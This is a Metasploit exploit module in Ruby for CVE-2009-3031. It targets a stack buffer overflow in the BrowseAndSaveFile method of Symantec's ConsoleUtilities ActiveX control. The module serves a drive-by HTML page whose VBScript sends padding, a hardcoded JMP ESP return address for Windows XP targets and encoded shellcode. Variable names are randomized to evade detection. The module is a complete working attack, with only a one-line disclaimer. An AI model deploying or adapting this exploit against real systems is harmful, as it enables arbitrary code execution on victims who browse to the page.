## 
# Use it only for education or ethical pentesting! The author accepts no liability for damage caused by this tool.
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

        include Msf::Exploit::Remote::HttpServer::HTML

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Symantec ConsoleUtilities ActiveX Control Buffer Overflow',
                        'Description'    => %q{
                                        This module exploits a stack overflow in Symantecs ConsoleUtilities.
                                        By sending an overly long string to the "BrowseAndSaveFile()" method located
                                        in the AeXNSConsoleUtilities.dll (6.0.0.1846) Control, an attacker may be able to
                                        execute arbitrary code.
                        },
                        'License'        => MSF_LICENSE,
                        'Author'         => [ 'Nikolas Sotiriu (lofi)' ],
                        'Version'        => '1.0',
                        'References'     =>
                                [
                                        [ 'CVE', '2009-3031'],
                                        [ 'URL', 'http://sotiriu.de/adv/NSOADV-2009-001.txt' ],
                                        [ 'URL', 'http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2009&suid=20091102_00' ],
                                ],
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'process',
                                },
                        'Payload'        =>
                                {
                                        'Space'         => 1000,
                                        'BadChars'      => "\x00",
                                        'StackAdjustment' => -3500,
                                },
                        'Platform'       => 'win',
                        'Targets'        =>
                                [
					[ 'Windows XP SP2 Universal',	    { 'Ret' => 0x77d92acc } ], # USER32.dll JMP ESP
					[ 'Windows XP SP2 Pro German',      { 'Ret' => 0x77D5AF0A } ], # SHELL32.dll JMP ESP
					[ 'Windows XP SP3 Pro German',      { 'Ret' => 0x7E6830D7 } ], # SHELL32.dll JMP ESP
                                ],
                        'DisclosureDate' => 'Nov 02 2009',
                        'DefaultTarget'  => 0))
        end

        def autofilter
                        false
        end

        def check_dependencies
                        use_zlib
        end

        def on_request_uri(cli, request)
                # Re-generate the payload
                return if ((p = regenerate_payload(cli)) == nil)

                # Randomize variables
                vname   = rand_text_alpha(rand(20) + 1)
                junk    = rand_text_alpha(rand(20) + 1)
                eip     = rand_text_alpha(rand(20) + 1)
                morejunk = rand_text_alpha(rand(20) + 1)
                sc      = rand_text_alpha(rand(20) + 1)
                buf = rand_text_alpha(rand(20) + 1)


                # Set RET and shellcode
                ret = Rex::Text.to_unescape([target.ret].pack('V'))
                shellcode = Rex::Text.to_unescape(p.encoded)

                # Build the Site
                content = %Q|
                        <html>
                        <object classid='clsid:B44D252D-98FC-4D5C-948C-BE868392A004' id='#{vname}'></object>
                        <script language='vbscript'>
                        arg1 = ""
                        arg3 = ""
                        arg4 = ""
                        arg5 = ""

                        #{junk}=String(310, "A")
                        #{eip}=unescape("#{ret}")
                        #{morejunk}=String(18, unescape("%u0041"))
                        #{sc}=unescape("#{shellcode}")

                        #{buf}=#{junk}+#{eip}+#{morejunk}+#{sc}
                        #{vname}.BrowseAndSaveFile arg1,#{buf},arg3,arg4,arg5
                        </script>
                        </html>
                  |

                print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

                # Transmit the response to the client
                send_response_html(cli, content)

                # Handle the payload
                handler(cli)
        end

end